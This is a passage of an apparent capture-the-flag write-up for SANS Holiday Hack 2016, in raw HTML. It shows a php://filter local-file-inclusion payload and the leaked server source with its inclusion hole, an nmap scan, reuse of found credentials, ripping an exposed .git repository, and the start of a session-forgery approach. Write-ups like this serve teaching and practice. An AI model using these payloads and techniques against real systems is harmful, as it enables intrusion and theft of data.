&lt;p&gt;Final payload &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;operation&quot;:&quot;ReadCrashDump&quot;,&quot;data&quot;:{&quot;crashdump&quot;:&quot;php://filter/convert.base64-encode/resource=crashdump-aDjJbG&quot;}}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Saving the base64 encoded text to a file, then decoding it reveals the location of the audio file.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_base64.txt| base64 -D &amp;gt; exception_decoded.txt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_decoded.txt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Make sure that it is a POST request.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;die(&quot;Request method must be POST\n&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Make sure that the content type of the POST request has been set to application/json&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$contentType = isset($_SERVER[&quot;CONTENT_TYPE&quot;]) ? trim($_SERVER[&quot;CONTENT_TYPE&quot;])&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;';&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;if(strcasecmp($contentType, 'application/json') != 0){&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;die(&quot;Content type must be&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json\n&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Grab the raw POST. Necessary for JSON in particular.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$content = file_get_contents(&quot;php://input&quot;);&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;$obj = json_decode($content, &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# If json_decode failed, the JSON is invalid.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;if(!is_array($obj)){&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;die(&quot;POST contains invalid JSON!\n&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Process the JSON.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;if ( ! isset( $obj['operation']) or (&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$obj['operation'] !== &quot;WriteCrashDump&quot; and&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$obj['operation'] !== &quot;ReadCrashDump&quot;))&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;die(&quot;Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.\n&quot;);&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;if ( isset($obj['data'])) {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;if ($obj['operation'] === &quot;WriteCrashDump&quot;) {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# Write a new crash dump to disk&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;processCrashDump($obj['data']);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;elseif ($obj['operation'] === &quot;ReadCrashDump&quot;) {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# Read a crash dump back from disk&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;readCrashdump($obj['data']);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;else {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# data key unset&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;die(&quot;Fatal error! JSON key 'data' must be set.\n&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;function processCrashdump($crashdump) {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$basepath = &quot;/var/www/html/docs/&quot;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$outputfilename = tempnam($basepath, &quot;crashdump-&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;unlink($outputfilename);&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$outputfilename = $outputfilename . &quot;.php&quot;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$basename = basename($outputfilename);&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$crashdump_encoded = &quot;&amp;lt;?php print('&quot; . json_encode($crashdump, JSON_PRETTY_PRINT) . &quot;');&quot;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;file_put_contents($outputfilename, $crashdump_encoded);&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;print &amp;lt;&amp;lt;&amp;lt;END&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;success&quot;&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;folder&quot;&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;docs&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;crashdump&quot;&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$basename&quot;&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;END;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;function readCrashdump($requestedCrashdump) {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$basepath = &quot;/var/www/html/docs/&quot;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;chdir($basepath);&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;if ( ! isset($requestedCrashdump['crashdump'])) {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;die(&quot;Fatal error! JSON key 'crashdump' must be set.\n&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	}&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;if ( substr(strrchr($requestedCrashdump['crashdump'], &quot;.&quot;), 1) === &quot;php&quot; ) {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;die(&quot;Fatal error! crashdump value duplicate '.php' extension detected.\n&quot;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;else {&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;require($requestedCrashdump['crashdump'] . '.php');&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Audio file location: http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Uncaught Exception Handler Server is complete!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;the-mobile-analytics-server-via-credentialed-login-access&quot;&gt;The Mobile Analytics Server (via credentialed login access)&lt;/h3&gt;

&lt;p&gt;Using the credentials found during &lt;a href=&quot;/challenges/#part-1-a-most-curious-business-card&quot;&gt;Part 1: A Most Curious Business Card&lt;/a&gt; in the APK file, &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;busyreindeer78&lt;/code&gt; provided credentialed access to the login portal at &lt;code class=&quot;highlighter-rouge&quot;&gt;https://analytics.northpolewonderland.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/analytics_as_guest.png&quot; alt=&quot;analytics_site&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once authenticated, simply click the &lt;a href=&quot;https://analytics.northpolewonderland.com/getaudio.php?id=20c216bc-b8b1-11e6-89e1-42010af00008&quot;&gt;MP3 link&lt;/a&gt; at the top to grab &lt;code class=&quot;highlighter-rouge&quot;&gt;discombobulatedaudio2.mp3&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Mobile Analytics Server (via credentialed login access) is complete!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;the-mobile-analytics-server-post-authentication&quot;&gt;The Mobile Analytics Server (post authentication)&lt;/h3&gt;

&lt;p&gt;Already knowing that I had the audio file for the authenticated &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt; account, there must be another area to attack on this server.  Another elf named “Minty Candycane” suggested using the nmap default scripts (-sC) flag to find extra files on web servers.  Let’s give it a shot.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ nmap -sC -p- analytics.northpolewonderland.com -oA analytics.northpolewonderland.com&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 13:32 EST&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Nmap scan report for analytics.northpolewonderland.com (104.198.252.157)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Host is up (0.040s latency).&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;rDNS record for 104.198.252.157&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;157.252.198.104.bc.googleusercontent.com&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Not shown&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;65533 filtered ports&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PORT    STATE SERVICE&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;22/tcp  open  ssh&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;ssh-hostkey:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;43/tcp open  https&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt; http-git:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;   104.198.252.157:443/.git/&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;     Git repository found!&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;     Repository description: Unnamed repository; edit this file 'description' to name the...&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_    Last commit message: Finishing touches (style, css, etc)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt; http-title: Sprusage Usage Reporter!&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_Requested resource was login.php&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt; ssl-cert: Subject: commonName=analytics.northpolewonderland.com&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt; Subject Alternative Name: DNS:analytics.northpolewonderland.com&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt; Not valid before: 2016-12-07T17:35:00&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_Not valid after:  2017-03-07T17:35:00&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_ssl-date: ERROR: Script execution failed (use -d to debug)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt; tls-nextprotoneg:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_  http/1.1&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;map done: 1 IP address (1 host up) scanned in 125.65 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A Git repository found! To clone the repository locally, I used &lt;a href=&quot;https://github.com/kost/dvcs-ripper&quot;&gt;dvcs-ripper&lt;/a&gt;.  Just clone the dvcs-ripper repo, install any missing requirements and point rip-git.pl at the .git directory. Will also need to ignore SSL certification verification (with -s).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ./rip-git.pl -s -v -u 'https://analytics.northpolewonderland.com/.git/'
[i] Downloading git files from https://analytics.northpolewonderland.com/.git/
[i] Auto-detecting 404 as 200 with 3 requests
[i] Getting correct 404 responses
[i] Using session name: MtvKvTOc
[d] found COMMIT_EDITMSG
[d] found config
[d] found description
[d] found HEAD
[d] found index
[!] Not found for packed-refs: 404 Not Found
[!] Not found for objects/info/alternates: 404 Not Found
[!] Not found for info/grafts: 404 Not Found
[d] found logs/HEAD
[d] found objects/d6/3a7e0df35ad525fa40eceae67be5b27215ece8
[d] found objects/10/57b70e7681f44aac2789e26a2b714327d8c203
[d] found objects/bb/2646691fc9f6bf5f1a0ade746b28f8147ffa48
[d] found objects/42/0f433fe33d14abac5c3a588c3e753d0d71d50d
[d] found objects/5f/0c135e1479d865945577c0a70d0cf39e49cdc7
[d] found objects/d9/636a3d648e617fcb92055dea63ac2469f67c84
[d] found objects/f0/d28ed3cc39538a6c415789408ef3f24ded959c
[d] found objects/02/e8d14ffa8910bfd5365ff36eb96bcd7efc4409
[d] found objects/6a/b9fe6ec3de2e28b79108ff5110643e9ba32478
[d] found objects/cf/5f27b161f53d62f97ad6ebc648701288a2ea89
[d] found objects/26/89a45ab9c38d92675660b9113fc173a0ccf129
[d] found objects/25/9d406f3f2345b50338d54a53efa36dd08f6f20
[d] found objects/15/62064538562f077d388044e344e3c2d85450d7
[d] found objects/07/78ac7de1d7ff8ae46ebabdee33a340ab9506f3
[d] found objects/19/08b71d42bce15345cabb7a63f57b5c79b85d15
[d] found objects/43/970092ea851cff05e44aba3e0a67eb351304f3
[d] found objects/58/c900fd53fced0d588e00e23c26cb8465eed498
[d] found objects/88/5ec6a4e870ce983aecde3a4f0e398b6a76615f
[d] found objects/45/edadc1850c3894ab8850d1d77dca9a074a3a6a
[d] found objects/85/a4207c178fa0f9c6b6bb77a6d42eac487159c0
[d] found objects/62/547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
[d] found objects/93/5d79726e13ab65c3b5baa4d925de86059057d4
[d] found objects/e4/6b41e391ee0e9f4afab7880982501ac1471fb4
[d] found objects/10/6079e728c97ebea387042a2e076fab62952e1e
[d] found objects/16/ae0cbe2630a87c0470b9a864bf048e813826db
[d] found refs/heads/master
[i] Running git fsck to check for missing items
Checking object directories: 100% (256/256), done.
Checking objects: 100% (139/139), done.
[i] Got items with git fsck: 0, Items fetched: 0
[!] No more items to fetch. That's it!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Time to see what was pulled down…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ls -la&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;total 304&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  33 josh  wheel   1122 Dec 29 13:52 .&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x@ 22 josh  wheel    748 Dec 26 09:31 ..&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  14 josh  wheel    476 Dec 29 13:56 .git&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    149 Dec 16 20:58 .gitignore&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel  18027 Dec 16 20:58 LICENSE&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    310 Dec 29 13:52 README.md&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   2 josh  wheel     68 Dec 29 13:45 captured&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    290 Dec 29 13:52 crypto.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  11 josh  wheel    374 Dec 29 13:52 css&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   2958 Dec 29 13:52 db.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   2392 Dec 29 13:52 edit.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   7 josh  wheel    238 Dec 29 13:52 fonts&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel     29 Dec 29 13:52 footer.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   1191 Dec 29 13:52 getaudio.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   2000 Dec 29 13:52 header.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    819 Dec 29 13:52 index.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   5 josh  wheel    170 Dec 29 13:52 js&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   2913 Dec 29 13:52 login.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    174 Dec 29 13:52 logout.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    325 Dec 29 13:52 mp3.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   7697 Dec 29 13:52 query.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   2252 Dec 29 13:52 report.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x   1 josh  wheel   6401 Dec 16 20:58 rip-bzr.pl&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x   1 josh  wheel   4718 Dec 16 20:58 rip-cvs.pl&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x   1 josh  wheel  15114 Dec 16 20:58 rip-git.pl&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x   1 josh  wheel   6102 Dec 16 20:58 rip-hg.pl&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x   1 josh  wheel   6157 Dec 16 20:58 rip-svn.pl&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   5008 Dec 29 13:52 sprusage.sql&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x   6 josh  wheel    204 Dec 29 13:52 test&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    629 Dec 29 13:52 this_is_html.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    739 Dec 29 13:52 this_is_json.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel    647 Dec 29 13:52 uuid.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r--   1 josh  wheel   1949 Dec 29 13:52 view.php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Taking a look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;header.php&lt;/code&gt; file revealed that there was also an &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt; user and they were the only one allowed to view &lt;code class=&quot;highlighter-rouge&quot;&gt;edit.php&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat header.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&amp;lt;div class=&quot;navbar-collapse collapse&quot; id=&quot;navbar-main&quot;&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&amp;lt;ul class=&quot;nav navbar-nav&quot;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a href=&quot;/query.php&quot;&amp;gt;Query&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a href=&quot;/view.php&quot;&amp;gt;View&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;&amp;lt;?php&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;if (get_username() == 'guest') {&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;?&amp;gt;&lt;/span&gt;
                  &lt;span class=&quot;s&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a href=&quot;/&amp;lt;?= mp3_web_path($db); ?&amp;gt;&quot;&amp;gt;MP3&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&amp;lt;?php&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;if (get_username() == 'administrator') {&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;?&amp;gt;&lt;/span&gt;
                  &lt;span class=&quot;s&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a href=&quot;/edit.php&quot;&amp;gt;Edit&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&amp;lt;?php&lt;/span&gt;
              &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;?&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The next question you may be asking yourself is, “How do I get the password for the administrator account?”  At this point, you can’t.  However, without a password, how else can you control another user’s authenticated session?&lt;/p&gt;

&lt;p&gt;The answer is at the bottom of &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat login.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;EOF;&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;} else {&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;require_once('db.php');&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;check_user($db, $_POST['username'], $_POST['password']);&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;print &quot;Successfully logged in!&quot;;&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;$auth = encrypt(json_encode([&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;'username' =&amp;gt; $_POST['username'],&lt;/span&gt;
